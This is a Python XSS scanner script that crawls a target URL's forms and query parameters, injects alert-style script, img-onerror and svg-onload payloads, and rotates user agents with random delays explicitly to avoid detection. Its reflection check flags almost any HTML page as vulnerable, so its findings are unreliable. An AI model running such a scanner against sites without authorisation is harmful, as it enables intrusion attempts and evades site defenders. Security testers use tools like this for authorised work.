import requests
from bs4 import BeautifulSoup
import argparse
import random
import time
import urllib.parse
from urllib.parse import urljoin, urlparse
import os

# Configuration
REQUEST_DELAY = (1, 3)  # Random delay between requests in seconds
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
]

def load_payloads(payload_file="xss-payloads.txt"):
    """Load XSS payloads from a file"""
    if not os.path.exists(payload_file):
        print(f"[!] Payload file {payload_file} not found!")
        # Return some basic payloads as fallback
        return [
            "<script>alert('XSS')</script>",
            "'\"><img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        ]
    
    with open(payload_file, 'r', encoding='utf-8', errors='ignore') as f:
        payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    return payloads

def get_random_headers():
    """Generate random headers to avoid detection"""
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    }

def is_same_domain(url1, url2):
    """Check if two URLs are from the same domain"""
    return urlparse(url1).netloc == urlparse(url2).netloc

def scan_url(url, payloads, cookies=None, proxy=None, timeout=10):
    """Scan a URL for XSS vulnerabilities"""
    print(f"[*] Scanning {url}")
    
    # Configure session
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)
    
    if proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    try:
        # Initial request with random headers
        response = session.get(url, headers=get_random_headers(), timeout=timeout)
        soup = BeautifulSoup(response.content, 'html.parser')
        forms = soup.find_all('form')
        
        # Also check for URLs with parameters
        parsed_url = urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if query_params:
            print(f"[*] Found {len(query_params)} URL parameters to test")
            test_url_parameters(url, query_params, payloads, session)
        
        print(f"[*] Found {len(forms)} forms to test")
        
        for form in forms:
            time.sleep(random.uniform(*REQUEST_DELAY))  # Random delay
            
            form_action = form.get('action')
            form_method = form.get('method', 'get').lower()
            form_url = urljoin(url, form_action) if form_action else url
            
            # Only test forms on the same domain
            if not is_same_domain(url, form_url):
                print(f"[*] Skipping form from different domain: {form_url}")
                continue
            
            inputs = form.find_all('input')
            form_data = {}
            for input_tag in inputs:
                input_name = input_tag.get('name')
                input_type = input_tag.get('type', 'text')
                input_value = input_tag.get('value', '')
                
                if input_name and input_type not in ['submit', 'button']:
                    form_data[input_name] = input_value if input_value else 'test'
            
            # Also include textarea and select elements
            textareas = form.find_all('textarea')
            for textarea in textareas:
                textarea_name = textarea.get('name')
                if textarea_name:
                    form_data[textarea_name] = 'test'
            
            selects = form.find_all('select')
            for select in selects:
                select_name = select.get('name')
                if select_name:
                    form_data[select_name] = 'test'
            
            if form_data:
                test_form(form_url, form_method, form_data, payloads, session)
            else:
                print(f"[*] Form at {form_url} has no parameters to test")
    
    except Exception as e:
        print(f"[!] Error scanning {url}: {e}")

def test_form(form_url, form_method, form_data, payloads, session):
    """Test a form for XSS vulnerabilities"""
    print(f"[*] Testing form at {form_url} with {len(form_data)} fields")
    
    for field_name in form_data:
        print(f"[*] Testing field: {field_name}")
        
        for payload in payloads:
            time.sleep(random.uniform(*REQUEST_DELAY))  # Random delay
            
            test_data = form_data.copy()
            test_data[field_name] = payload
            
            try:
                if form_method == 'post':
                    response = session.post(form_url, data=test_data, headers=get_random_headers(), timeout=10)
                else:
                    # For GET forms, we need to append the parameters to the URL
                    parsed_url = urlparse(form_url)
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                    query_params.update(test_data)
                    
                    # Rebuild the URL with parameters
                    url_parts = list(parsed_url)
                    url_parts[4] = urllib.parse.urlencode(query_params, doseq=True)
                    target_url = urllib.parse.urlunparse(url_parts)
                    
                    response = session.get(target_url, headers=get_random_headers(), timeout=10)
                
                # Check if payload is reflected in response
                if check_payload_reflection(response.text, payload):
                    print(f"[!] POTENTIAL XSS VULNERABILITY FOUND!")
                    print(f"    Form: {form_url}")
                    print(f"    Method: {form_method.upper()}")
                    print(f"    Field: {field_name}")
                    print(f"    Payload: {payload}")
                    print(f"    Response length: {len(response.text)}\n")
                    
                    # Save finding to file
                    with open("xss_findings.txt", "a") as f:
                        f.write(f"URL: {form_url}\n")
                        f.write(f"Method: {form_method.upper()}\n")
                        f.write(f"Field: {field_name}\n")
                        f.write(f"Payload: {payload}\n")
                        f.write(f"Response length: {len(response.text)}\n")
                        f.write("-" * 50 + "\n")
                    
                    break  # Move to next field after first hit
            
            except Exception as e:
                print(f"[!] Error testing {form_url}: {e}")

def test_url_parameters(url, query_params, payloads, session):
    """Test URL parameters for XSS vulnerabilities"""
    for param_name in query_params:
        print(f"[*] Testing URL parameter: {param_name}")
        
        for payload in payloads:
            time.sleep(random.uniform(*REQUEST_DELAY))  # Random delay
            
            # Create a copy of the query parameters
            test_params = {k: v[0] if isinstance(v, list) and len(v) == 1 else v 
                          for k, v in query_params.items()}
            test_params[param_name] = payload
            
            # Rebuild the URL with the test parameter
            parsed_url = urlparse(url)
            url_parts = list(parsed_url)
            url_parts[4] = urllib.parse.urlencode(test_params, doseq=True)
            target_url = urllib.parse.urlunparse(url_parts)
            
            try:
                response = session.get(target_url, headers=get_random_headers(), timeout=10)
                
                # Check if payload is reflected in response
                if check_payload_reflection(response.text, payload):
                    print(f"[!] POTENTIAL XSS VULNERABILITY FOUND!")
                    print(f"    URL: {target_url}")
                    print(f"    Parameter: {param_name}")
                    print(f"    Payload: {payload}")
                    print(f"    Response length: {len(response.text)}\n")
                    
                    # Save finding to file
                    with open("xss_findings.txt", "a") as f:
                        f.write(f"URL: {target_url}\n")
                        f.write(f"Parameter: {param_name}\n")
                        f.write(f"Payload: {payload}\n")
                        f.write(f"Response length: {len(response.text)}\n")
                        f.write("-" * 50 + "\n")
                    
                    break  # Move to next parameter after first hit
            
            except Exception as e:
                print(f"[!] Error testing {target_url}: {e}")

def check_payload_reflection(response_text, payload):
    """Check if the payload is reflected in the response"""
    # Basic check - payload exists in response
    if payload in response_text:
        return True
    
    # Additional checks for encoded payloads
    encoded_payload = urllib.parse.quote(payload)
    if encoded_payload in response_text:
        return True
    
    # Check for partial reflection
    if any(char in response_text for char in ['<', '>', '"', "'", 'javascript:', 'onerror', 'onload']):
        # If we see HTML tags or event handlers that might indicate partial reflection
        return True
    
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner')
    parser.add_argument('url', help='The URL to scan')
    parser.add_argument('--payloads', '-p', default='xss-payloads.txt', help='File containing XSS payloads')
    parser.add_argument('--cookies', '-c', help='Cookies in format "name1=value1; name2=value2"')
    parser.add_argument('--proxy', help='Proxy server in format http://proxy:port')
    parser.add_argument('--delay', type=float, help='Delay between requests in seconds')
    
    args = parser.parse_args()
    
    # Load payloads
    payloads = load_payloads(args.payloads)
    print(f"[*] Loaded {len(payloads)} payloads")
    
    # Parse cookies if provided
    cookies = {}
    if args.cookies:
        for cookie in args.cookies.split(';'):
            if '=' in cookie:
                name, value = cookie.strip().split('=', 1)
                cookies[name] = value
    
    # Set delay if provided
    if args.delay:
        REQUEST_DELAY = (args.delay, args.delay + 1)
    
    # Clear previous findings
    if os.path.exists("xss_findings.txt"):
        os.remove("xss_findings.txt")
    
    # Start scanning
    scan_url(args.url, payloads, cookies, args.proxy)
